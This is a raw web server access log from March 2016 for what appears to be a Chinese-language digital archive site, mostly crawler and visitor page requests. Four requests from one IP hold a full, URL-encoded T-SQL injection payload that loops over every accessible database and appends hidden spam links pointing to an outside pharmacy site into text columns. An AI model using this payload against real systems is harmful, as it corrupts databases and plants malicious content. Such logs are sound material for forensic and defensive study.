66.249.75.251 - - [30/Mar/2016:13:50:51 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8F%B0%E6%9D%B1%E8%98%87%E9%90%B5+&oid=16777436 HTTP/1.1" 200 4086
66.249.69.182 - - [30/Mar/2016:13:50:56 +0800] "GET /content/repository/resource_content.jsp?oid=4364498&queryType=qs&queryString=%E6%A4%B0%E6%AE%BC HTTP/1.1" 200 28652
66.249.75.135 - - [30/Mar/2016:13:51:19 +0800] "GET /content/repository/resource_content.jsp?oid=523471&queryString=%E8%9F%B9%E5%AE%88%20%E8%9F%B9%E5%AE%88%E8%9E%BA%20%E9%A0%85%E9%8D%8A%E8%9F%B9%E5%AE%88%E8%9E%BA%20%E9%BB%91%E9%A0%85%E9%8D%8A%E8%9F%B9%E5%AE%88%E8%9E%BA HTTP/1.1" 200 33760
66.249.69.9 - - [30/Mar/2016:13:51:42 +0800] "GET /content/subject/resource_content.jsp?oid=16777590&queryString=%E6%B5%81%E8%BD%89%E5%B9%B4%E8%8F%AF HTTP/1.1" 200 35473
66.249.69.9 - - [30/Mar/2016:13:52:00 +0800] "GET /content/repository/resource_content.jsp?oid=2152111&queryString=%E6%A0%93%E7%9A%AE%E6%AB%9F%20%E6%A4%8D%E7%89%A9%E7%95%8C%20%E6%AB%9F%E5%B1%AC%20%E6%AE%BC%E6%96%97%E7%A7%91 HTTP/1.1" 200 31209
68.180.230.90 - - [30/Mar/2016:13:52:14 +0800] "GET /digiarch_en/content/pictures/picture_content.jsp?oid=33554747 HTTP/1.1" 200 21664
66.249.69.9 - - [30/Mar/2016:13:52:25 +0800] "GET /content/repository/resource_content.jsp?oid=16506&queryString=%E9%89%A4%E9%B1%97%E9%AD%A8%20%E9%AD%A8%E7%A7%91%20%E9%B1%97%E9%AD%A8%20%E9%B1%97%E9%AD%A8%E7%A7%91 HTTP/1.1" 200 34281
123.125.71.46 - - [30/Mar/2016:13:52:34 +0800] "GET /content/subject/resource_content.jsp?oid=16777729&queryType=qc HTTP/1.1" 200 51724
66.249.75.251 - - [30/Mar/2016:13:52:41 +0800] "GET /content/repository/resource_content.jsp?oid=1887681&queryType=qs&queryString=%E5%BC%B5%E5%9C%8B%E7%8F%8D HTTP/1.1" 200 31233
66.249.75.251 - - [30/Mar/2016:13:53:08 +0800] "GET /content/repository/resource_content.jsp?oid=1887856&queryString=%E4%B8%AD%E8%97%A5%20%E4%B9%BE%E5%85%83%20%E5%95%86%E8%A1%8C%20%E8%BF%AA%E5%8C%96%E8%A1%97 HTTP/1.1" 200 30378
66.249.69.9 - - [30/Mar/2016:13:53:49 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8D%97%E9%99%BD%E7%B8%A3+%E7%9F%B3%E6%A9%8B%E9%8E%AE+%E8%88%9E%E6%A8%82%E7%99%BE%E6%88%B2+&oid=1807251 HTTP/1.1" 200 3204
66.249.69.9 - - [30/Mar/2016:13:53:54 +0800] "GET /content/subject/resource_content.jsp?oid=16777472&queryType=qs&queryString=%E7%A0%94%E7%A9%B6%E5%AE%A4 HTTP/1.1" 200 64915
27.246.137.96 - - [30/Mar/2016:13:54:29 +0800] "GET /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 30170
27.246.137.96 - - [30/Mar/2016:13:54:31 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%95%86%E8%81%B7+%E5%9C%8B%E6%A0%A1+%E5%AD%B8%E9%9B%9C%E8%B2%BB+%E6%83%A1%E6%80%A7%E8%A3%9C%E7%BF%92+%E6%B2%99%E9%B9%BF+%E8%87%BA%E4%B8%AD%E7%B8%A3+%E8%A3%9C%E7%BF%92%E7%8F%AD+%E9%AB%98%E9%9B%84%E7%B8%A3%E7%BE%8E%E6%BF%83%E9%8E%AE+&oid=1566551 HTTP/1.1" 200 4624
27.246.137.96 - - [30/Mar/2016:13:54:35 +0800] "HEAD /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 -
27.246.137.96 - - [30/Mar/2016:13:54:36 +0800] "GET /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 30170
66.249.69.87 - - [30/Mar/2016:13:54:37 +0800] "GET /content/repository/resource_content.jsp?oid=14410&queryString=%E5%8F%B0%E7%81%A3%E9%8F%9F%E9%A0%9C%E9%AD%9A%20%E7%94%B2%E9%AD%9A%20%E7%99%BD%E7%94%B2%20%E9%8F%9F%E9%A0%9C%E9%AD%9A%20%E9%AF%89%E7%A7%91%20%E9%BD%8A%E9%A0%AD%E5%81%8E HTTP/1.1" 200 35635
66.249.69.9 - - [30/Mar/2016:13:55:20 +0800] "GET /content/repository/resource_content.jsp?oid=14376&queryString=GBIF%20%E5%8F%B0%E7%81%A3%E9%AD%9A%E9%A1%9E%20%E5%A4%9A%E6%A8%A3%E6%80%A7%20%E6%B5%B7%E9%AE%AE%20%E7%94%9F%E7%89%A9%E5%A4%9A%E6%A8%A3%E6%80%A7%20%E8%99%B1%E7%9B%AE%E9%AD%9A HTTP/1.1" 200 34688
66.249.75.251 - - [30/Mar/2016:13:55:26 +0800] "GET /content/subject/resource_content.jsp?oid=16777299&queryString=%E5%9C%8B%E9%9A%9B%E6%9B%B8%E5%B1%95%20%E6%95%B8%E4%BD%8D%E5%85%B8%E8%97%8F%20%E6%95%B8%E4%BD%8D%E5%AD%B8%E7%BF%92%20%E7%A7%91%E6%8A%80%20%E8%A6%96%E8%A6%BA%20%E8%A6%96%E8%A6%BA%E8%A8%AD%E8%A8%88 HTTP/1.1" 200 35795
66.249.69.73 - - [30/Mar/2016:13:55:50 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%B1%E7%94%A2%E9%BB%A8+%E8%87%B4%E7%BE%8E+&oid=1539904 HTTP/1.1" 200 7254
66.249.69.57 - - [30/Mar/2016:13:55:54 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%B1%E7%94%A2%E9%BB%A8%20%E8%87%B4%E7%BE%8E%20&oid=1539904 HTTP/1.1" 200 7254
66.249.75.251 - - [30/Mar/2016:13:56:05 +0800] "GET /content/repository/resource_content.jsp?oid=1894399&queryType=qs&queryString=%E5%AE%8B%E8%89%BE%E5%85%8B HTTP/1.1" 200 29308
66.249.69.9 - - [30/Mar/2016:13:56:07 +0800] "GET /content/repository/resource_content.jsp?oid=1125982 HTTP/1.1" 200 29326
66.249.69.9 - - [30/Mar/2016:13:56:33 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E5%9C%8B%E5%A4%A7%E9%99%B8%E5%9C%B0%E5%9C%96+&oid=205941 HTTP/1.1" 200 1424
66.249.69.192 - - [30/Mar/2016:13:57:29 +0800] "GET /content/repository/resource_content.jsp?oid=4364182&queryType=qs&queryString=%E7%B4%85%E6%9C%A8 HTTP/1.1" 200 28404
66.249.69.87 - - [30/Mar/2016:13:57:31 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=%E5%87%B9%E5%B0%BE%E5%A1%98%E9%B1%A7%20%E5%A1%98%E9%B1%A7%20%E5%A4%A7%E5%8F%A3%E7%B7%9A%E5%A1%98%E9%B1%A7%20%E7%B5%B2%E9%B0%AD%20%E7%B5%B2%E9%B0%AD%E7%B7%9A%E5%A1%98%E9%B1%A7%20%E9%B1%A7%E7%A7%91%20&oid=4353118 HTTP/1.1" 200 3590
66.249.75.251 - - [30/Mar/2016:13:57:34 +0800] "GET /content/repository/resource_content.jsp?oid=2679892&queryString=%E5%8F%83%E8%AD%B0%E5%93%A1%20%E5%8F%83%E8%AD%B0%E6%9C%83%20%E5%8F%B0%E7%81%A3%E7%9C%81%20%E5%90%88%E4%BD%9C%E7%A4%BE%20%E6%9D%8E%E5%B4%87%20%E6%9D%8E%E5%B4%87%E7%A6%AE%20%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8 HTTP/1.1" 200 30109
114.39.5.183 - - [30/Mar/2016:13:57:50 +0800] "GET /digiarch3/content/repository/resource_content.jsp?oid=15078&queryType=qs&queryString=%E9%9B%80%E9%AF%9B HTTP/1.1" 200 35029
114.39.5.183 - - [30/Mar/2016:13:57:52 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=%E5%87%86%E9%9B%80%E9%AF%9B+%E7%B4%85%E7%8D%85%E5%85%AC+%E7%B4%85%E8%B2%93%E4%BB%94+%E8%8D%89%E8%8E%93+%E9%9B%80%E9%AF%9B%E7%A7%91+&oid=15078 HTTP/1.1" 200 3615
66.249.69.9 - - [30/Mar/2016:13:58:06 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%AC%E8%B7%AF%E5%B1%80%20%E9%B6%AF%E6%AD%8C%20&oid=1548818 HTTP/1.1" 200 4582
66.249.69.182 - - [30/Mar/2016:13:58:16 +0800] "GET /content/repository/resource_content.jsp?oid=2677858&queryType=qs&queryString=%E6%B5%B7%E5%AF%87 HTTP/1.1" 200 29515
66.249.75.251 - - [30/Mar/2016:13:58:30 +0800] "GET /content/subject/resource_content.jsp?oid=16777806&queryType=qc HTTP/1.1" 200 48577
27.246.137.96 - - [30/Mar/2016:13:58:34 +0800] "HEAD /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 -
27.246.137.96 - - [30/Mar/2016:13:58:36 +0800] "GET /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 30170
66.249.69.9 - - [30/Mar/2016:13:59:04 +0800] "GET /content/repository/resource_content.jsp?oid=3819293&queryString=%E5%8D%B7%E6%9F%8F%E5%B1%AC%20%E8%86%9C%E8%91%89%E5%8D%B7%E6%9F%8F HTTP/1.1" 200 31557
66.249.75.251 - - [30/Mar/2016:13:59:28 +0800] "GET /content/repository/resource_content.jsp?oid=15898&queryType=qs&queryString=%E5%A4%A7%E9%99%B8%E6%A3%9A HTTP/1.1" 200 34238
114.37.39.190 - - [30/Mar/2016:13:59:29 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%B1%B1%E6%AB%BB%E8%8A%B1+&oid=16777304 HTTP/1.1" 200 4452
150.70.173.48 - - [30/Mar/2016:13:59:43 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=%E5%87%86%E9%9B%80%E9%AF%9B+%E7%B4%85%E7%8D%85%E5%85%AC+%E7%B4%85%E8%B2%93%E4%BB%94+%E8%8D%89%E8%8E%93+%E9%9B%80%E9%AF%9B%E7%A7%91+&oid=15078 HTTP/1.1" 200 3615
66.249.69.87 - - [30/Mar/2016:13:59:44 +0800] "GET /content/repository/resource_content.jsp?oid=1530118&queryString=%E5%AF%A9%E5%88%A4%20%E6%B3%95%E9%99%A2%20%E8%A8%B4%E9%A1%98%20%E9%81%95%E8%AD%A6%E7%BD%B0%E6%B3%95 HTTP/1.1" 200 30116
150.70.173.57 - - [30/Mar/2016:13:59:50 +0800] "GET /digiarch3/content/repository/resource_content.jsp?oid=15078&queryType=qs&queryString=%E9%9B%80%E9%AF%9B HTTP/1.1" 200 35029
66.249.69.87 - - [30/Mar/2016:14:00:12 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%90%88%E5%BA%AB+%E5%94%90%E6%A6%AE+%E5%9B%BA%E5%AE%9A%E8%B3%87%E7%94%A2+%E7%9C%81%E7%87%9F%E4%BA%8B%E6%A5%AD+%E7%B6%9C%E5%90%88%E9%A0%90%E7%AE%97+%E8%87%BA%E7%81%A3%E7%9C%81+%E8%87%BA%E7%81%A3%E7%9C%81%E6%94%BF%E5%BA%9C+%E8%87%BA%E9%8A%80+%E8%AA%BF%E6%9F%A5%E7%A0%94%E7%A9%B6+%E9%A0%90%E7%AE%97+&oid=1900398 HTTP/1.1" 200 4937
66.249.69.87 - - [30/Mar/2016:14:00:16 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%90%88%E5%BA%AB%20%E5%94%90%E6%A6%AE%20%E5%9B%BA%E5%AE%9A%E8%B3%87%E7%94%A2%20%E7%9C%81%E7%87%9F%E4%BA%8B%E6%A5%AD%20%E7%B6%9C%E5%90%88%E9%A0%90%E7%AE%97%20%E8%87%BA%E7%81%A3%E7%9C%81%20%E8%87%BA%E7%81%A3%E7%9C%81%E6%94%BF%E5%BA%9C%20%E8%87%BA%E9%8A%80%20%E8%AA%BF%E6%9F%A5%E7%A0%94%E7%A9%B6%20%E9%A0%90%E7%AE%97%20&oid=1900398 HTTP/1.1" 200 4937
66.249.69.17 - - [30/Mar/2016:14:00:28 +0800] "GET /content/repository/resource_content.jsp?oid=2148446 HTTP/1.1" 200 31089
66.249.69.87 - - [30/Mar/2016:14:00:46 +0800] "GET /digiarch3/content/repository/resource_content.jsp?oid=4351730&queryString=%E8%96%AF%E9%B0%BB%20%E8%99%8E%E9%B0%BB%20%E8%A0%95%E7%B4%8B%E8%A3%B8%E8%83%B8%E9%AF%99%20%E8%A3%B8%E8%83%B8%E9%B1%94%20%E9%8C%A2%E9%B0%BB HTTP/1.1" 200 34235
66.249.69.87 - - [30/Mar/2016:14:01:12 +0800] "GET /digiarch3/content/repository/resource_content.jsp?oid=4354166&queryType=qs&queryString=%E6%B2%88%E4%B8%96%E5%82%91 HTTP/1.1" 200 33771
66.249.75.135 - - [30/Mar/2016:14:01:43 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%8D%90%E4%BA%8B+%E9%99%B3%E5%98%89%E6%B3%B0+&oid=2549487 HTTP/1.1" 200 3116
66.249.75.251 - - [30/Mar/2016:14:01:58 +0800] "GET /content/subject/resource_content.jsp?oid=16777481&queryString=%E5%B7%A1%E7%8B%A9%20%E5%BD%A9%E7%B9%AA%20%E7%8E%8B%E8%88%B9 HTTP/1.1" 200 112362
140.109.128.128 - - [30/Mar/2016:14:02:23 +0800] "GET /content/repository/resource_content.jsp?oid=1175028 HTTP/1.1" 200 27355
66.249.69.17 - - [30/Mar/2016:14:02:37 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%9C%B0%E5%BD%A2%E5%9C%96%20%E6%BF%89%E6%BA%AA%E5%8F%A3%20&oid=229500 HTTP/1.1" 200 3096
140.109.128.128 - - [30/Mar/2016:14:02:38 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%87%8C%E7%B4%94%E8%81%B2+&oid=1175028 HTTP/1.1" 200 3089
66.249.69.87 - - [30/Mar/2016:14:02:41 +0800] "GET /digiarch3/content/subject/resource_content.jsp?oid=16777660&queryType=qs&queryString=%E7%9A%87%E6%B0%91 HTTP/1.1" 200 70666
66.249.69.17 - - [30/Mar/2016:14:02:52 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E5%9C%8B%E5%A4%A7%E9%99%B8%E5%9C%B0%E5%9C%96+%E5%BB%A3%E5%B9%B3%E5%A2%9F+&oid=206113 HTTP/1.1" 200 3150
223.140.200.183 - - [30/Mar/2016:14:02:54 +0800] "GET /content/subject/resource_content.jsp?oid=16797253&queryType=qc HTTP/1.1" 200 42834
66.249.69.17 - - [30/Mar/2016:14:02:55 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E5%9C%8B%E5%A4%A7%E9%99%B8%E5%9C%B0%E5%9C%96%20%E5%BB%A3%E5%B9%B3%E5%A2%9F%20&oid=206113 HTTP/1.1" 200 3150
66.249.69.57 - - [30/Mar/2016:14:03:04 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%AC%E5%85%B1%E9%9B%BB%E8%A6%96+%E5%85%AC%E6%B0%91+%E5%85%AC%E8%A6%96+&oid=16777537 HTTP/1.1" 200 6820
223.140.200.183 - - [30/Mar/2016:14:03:09 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%BD%AE%E6%B5%81+%E7%A4%BE%E6%9C%83%E8%AE%8A%E9%81%B7+&oid=16797253 HTTP/1.1" 200 7712
66.249.69.9 - - [30/Mar/2016:14:03:24 +0800] "GET /content/repository/resource_content.jsp?oid=1617203 HTTP/1.1" 200 29585
114.136.102.22 - - [30/Mar/2016:14:03:27 +0800] "GET /content/repository/resource_content.jsp?oid=1844840&queryString=%E7%9F%B3%E7%90%AE HTTP/1.1" 200 30215
114.136.102.22 - - [30/Mar/2016:14:03:29 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E7%9F%B3%E7%90%AE+&oid=1844840 HTTP/1.1" 200 2963
89.38.209.50 - - [30/Mar/2016:14:03:42 +0800] "GET /content/subject/resource_content.jsp?oid=16777344';declare%20@b%20cursor;declare%20@s%20varchar(8000);declare%20@w%20varchar(99);set%20@b=cursor%20for%20select%20DB_NAME()%20union%20select%20name%20from%20sys.databases%20where%20(has_dbaccess(name)!=0)%20and%20name%20not%20in%20('master','tempdb','model','msdb',DB_NAME());open%20@b;fetch%20next%20from%20@b%20into%20@w;while%20@@FETCH_STATUS=0%20begin%20set%20@s='begin%20try%20use%20'%2B@w%2B';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20''update%20%5B''%2BTABLE_NAME%2B''%5D%20set%20%5B''%2BCOLUMN_NAME%2B''%5D=%5B''%2BCOLUMN_NAME%2B''%5D%2Bcase%20ABS(CHECKSUM(NewId()))%2510%20when%200%20then%20''''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''fluconazole%20pill%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2B''blog.ruleof3.ae''%2Bchar(47)%2B''page''%2Bchar(47)%2B''Zithromax-500Mg%22''%2Bchar(62)%2B''''''%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''''diflucan''''%20when%201%20then%20''''click''''%20else%20''''cephalexin%20250mg''''%20end%20%2B''''''%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20flagyl%20pill''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''''%20else%20''''''''%20end''%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid%20in%20(0,1))%20and%20DATA_TYPE%20like%20''%25varchar''%20and(CHARACTER_MAXIMUM_LENGTH%20in%20(2147483647,-1));open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c%20end%20try%20begin%20catch%20end%20catch';exec%20(@s);fetch%20next%20from%20@b%20into%20@w;end;close%20@b--&queryType=qc HTTP/1.1" 302 -
89.38.209.50 - - [30/Mar/2016:14:03:44 +0800] "GET /content/subject/resource_content.jsp?oid=16777344;declare%20@b%20cursor;declare%20@s%20varchar(8000);declare%20@w%20varchar(99);set%20@b=cursor%20for%20select%20DB_NAME()%20union%20select%20name%20from%20sys.databases%20where%20(has_dbaccess(name)!=0)%20and%20name%20not%20in%20('master','tempdb','model','msdb',DB_NAME());open%20@b;fetch%20next%20from%20@b%20into%20@w;while%20@@FETCH_STATUS=0%20begin%20set%20@s='begin%20try%20use%20'%2B@w%2B';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20''update%20%5B''%2BTABLE_NAME%2B''%5D%20set%20%5B''%2BCOLUMN_NAME%2B''%5D=%5B''%2BCOLUMN_NAME%2B''%5D%2Bcase%20ABS(CHECKSUM(NewId()))%2510%20when%200%20then%20''''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''fluconazole%20pill%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2B''blog.ruleof3.ae''%2Bchar(47)%2B''page''%2Bchar(47)%2B''Zithromax-500Mg%22''%2Bchar(62)%2B''''''%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''''diflucan''''%20when%201%20then%20''''click''''%20else%20''''cephalexin%20250mg''''%20end%20%2B''''''%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20flagyl%20pill''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''''%20else%20''''''''%20end''%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid%20in%20(0,1))%20and%20DATA_TYPE%20like%20''%25varchar''%20and(CHARACTER_MAXIMUM_LENGTH%20in%20(2147483647,-1));open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c%20end%20try%20begin%20catch%20end%20catch';exec%20(@s);fetch%20next%20from%20@b%20into%20@w;end;close%20@b--&queryType=qc HTTP/1.1" 302 -
89.38.209.50 - - [30/Mar/2016:14:03:45 +0800] "GET /content/subject/resource_content.jsp?oid=16777344);declare%20@b%20cursor;declare%20@s%20varchar(8000);declare%20@w%20varchar(99);set%20@b=cursor%20for%20select%20DB_NAME()%20union%20select%20name%20from%20sys.databases%20where%20(has_dbaccess(name)!=0)%20and%20name%20not%20in%20('master','tempdb','model','msdb',DB_NAME());open%20@b;fetch%20next%20from%20@b%20into%20@w;while%20@@FETCH_STATUS=0%20begin%20set%20@s='begin%20try%20use%20'%2B@w%2B';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20''update%20%5B''%2BTABLE_NAME%2B''%5D%20set%20%5B''%2BCOLUMN_NAME%2B''%5D=%5B''%2BCOLUMN_NAME%2B''%5D%2Bcase%20ABS(CHECKSUM(NewId()))%2510%20when%200%20then%20''''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''fluconazole%20pill%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2B''blog.ruleof3.ae''%2Bchar(47)%2B''page''%2Bchar(47)%2B''Zithromax-500Mg%22''%2Bchar(62)%2B''''''%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''''diflucan''''%20when%201%20then%20''''click''''%20else%20''''cephalexin%20250mg''''%20end%20%2B''''''%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20flagyl%20pill''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''''%20else%20''''''''%20end''%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid%20in%20(0,1))%20and%20DATA_TYPE%20like%20''%25varchar''%20and(CHARACTER_MAXIMUM_LENGTH%20in%20(2147483647,-1));open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c%20end%20try%20begin%20catch%20end%20catch';exec%20(@s);fetch%20next%20from%20@b%20into%20@w;end;close%20@b--&queryType=qc HTTP/1.1" 302 -
89.38.209.50 - - [30/Mar/2016:14:03:46 +0800] "GET /content/subject/resource_content.jsp?oid=16777344');declare%20@b%20cursor;declare%20@s%20varchar(8000);declare%20@w%20varchar(99);set%20@b=cursor%20for%20select%20DB_NAME()%20union%20select%20name%20from%20sys.databases%20where%20(has_dbaccess(name)!=0)%20and%20name%20not%20in%20('master','tempdb','model','msdb',DB_NAME());open%20@b;fetch%20next%20from%20@b%20into%20@w;while%20@@FETCH_STATUS=0%20begin%20set%20@s='begin%20try%20use%20'%2B@w%2B';declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20''update%20%5B''%2BTABLE_NAME%2B''%5D%20set%20%5B''%2BCOLUMN_NAME%2B''%5D=%5B''%2BCOLUMN_NAME%2B''%5D%2Bcase%20ABS(CHECKSUM(NewId()))%2510%20when%200%20then%20''''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''fluconazole%20pill%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2B''blog.ruleof3.ae''%2Bchar(47)%2B''page''%2Bchar(47)%2B''Zithromax-500Mg%22''%2Bchar(62)%2B''''''%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''''diflucan''''%20when%201%20then%20''''click''''%20else%20''''cephalexin%20250mg''''%20end%20%2B''''''%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20flagyl%20pill''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''''%20else%20''''''''%20end''%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid%20in%20(0,1))%20and%20DATA_TYPE%20like%20''%25varchar''%20and(CHARACTER_MAXIMUM_LENGTH%20in%20(2147483647,-1));open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c%20end%20try%20begin%20catch%20end%20catch';exec%20(@s);fetch%20next%20from%20@b%20into%20@w;end;close%20@b--&queryType=qc HTTP/1.1" 302 -
66.249.69.9 - - [30/Mar/2016:14:03:51 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%95%99%E8%82%B2%E5%BB%A3%E6%92%AD%E9%9B%BB%E5%8F%B0+&oid=16777610 HTTP/1.1" 200 3597
66.249.75.251 - - [30/Mar/2016:14:04:08 +0800] "GET /content/subject/resource_content.jsp?oid=16777291&queryType=qc HTTP/1.1" 200 28058
223.140.140.211 - - [30/Mar/2016:14:04:28 +0800] "GET /content/repository/resource_content.jsp?oid=1640592 HTTP/1.1" 200 29252
223.140.140.211 - - [30/Mar/2016:14:04:29 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E8%87%BA%E7%81%A3%E7%B8%BD%E7%9D%A3%E5%BA%9C+&oid=1640592 HTTP/1.1" 200 3393
223.140.140.211 - - [30/Mar/2016:14:04:32 +0800] "GET /content/repository/resource_content.jsp?oid=1888369&queryString=%E8%87%BA%E7%81%A3%E7%B8%BD%E7%9D%A3%E5%BA%9C HTTP/1.1" 200 31707
223.140.140.211 - - [30/Mar/2016:14:04:32 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%A4%8F%E6%9C%9F+%E6%9D%9C%E7%A3%81+%E6%9D%9C%E9%A6%99%E5%9C%8B+%E6%9F%AF%E6%B8%85%E6%A8%99+%E7%AE%97%E8%A1%93+%E8%87%BA%E7%81%A3%E7%B8%BD%E7%9D%A3%E5%BA%9C+%E8%8E%8A%E6%B0%B4+%E9%99%B3%E5%98%89%E9%82%A6+&oid=1888369 HTTP/1.1" 200 3427
66.249.75.251 - - [30/Mar/2016:14:04:44 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BD%9B%E6%95%99%E5%BE%92+&oid=4484410 HTTP/1.1" 200 1890
66.249.75.251 - - [30/Mar/2016:14:04:46 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BD%9B%E6%95%99%E5%BE%92%20&oid=4484410 HTTP/1.1" 200 1890
66.249.69.187 - - [30/Mar/2016:14:05:22 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E7%81%AB%E6%A7%8D%20%E8%93%91%E8%A1%A3%20&oid=4358671 HTTP/1.1" 200 3193
66.249.69.25 - - [30/Mar/2016:14:05:36 +0800] "GET /content/repository/resource_content.jsp?oid=16559 HTTP/1.1" 200 34677
66.249.69.9 - - [30/Mar/2016:14:06:08 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=33554551 HTTP/1.1" 200 1405
66.249.69.9 - - [30/Mar/2016:14:06:20 +0800] "GET /content/repository/resource_content.jsp?oid=1588983 HTTP/1.1" 200 29072
123.125.71.58 - - [30/Mar/2016:14:06:25 +0800] "GET /content/subject/resource_content.jsp?oid=16777517&amp;queryType=qc HTTP/1.1" 200 51831
27.246.137.96 - - [30/Mar/2016:14:06:32 +0800] "HEAD /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 -
27.246.137.96 - - [30/Mar/2016:14:06:33 +0800] "GET /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 30170
106.105.130.156 - - [30/Mar/2016:14:06:38 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%A4%A7%E8%91%89%E5%B1%B1%E6%AC%96+%E6%8B%BC%E6%9D%BF%E8%88%9F+%E9%81%94%E6%82%9F%E6%97%8F+&oid=16777270 HTTP/1.1" 200 4585
66.249.69.9 - - [30/Mar/2016:14:07:04 +0800] "GET /content/repository/resource_content.jsp?oid=1518708 HTTP/1.1" 200 28873
66.249.69.87 - - [30/Mar/2016:14:07:48 +0800] "GET /content/repository/resource_content.jsp?oid=523637&queryString=%E6%AD%A6%E5%BA%84%20%E7%89%A1%E8%A0%A3%20%E9%AB%98%E9%9B%84%E5%B7%9E%20%E9%B3%B3%E5%B1%B1%E9%83%A1 HTTP/1.1" 200 36080
157.55.39.82 - - [30/Mar/2016:14:08:09 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16777385 HTTP/1.1" 200 1405
66.249.69.25 - - [30/Mar/2016:14:08:34 +0800] "GET /content/subject/resource_content.jsp?oid=16777574&queryString=%E5%8F%A4%E5%9C%B0%E5%9C%96 HTTP/1.1" 200 29098
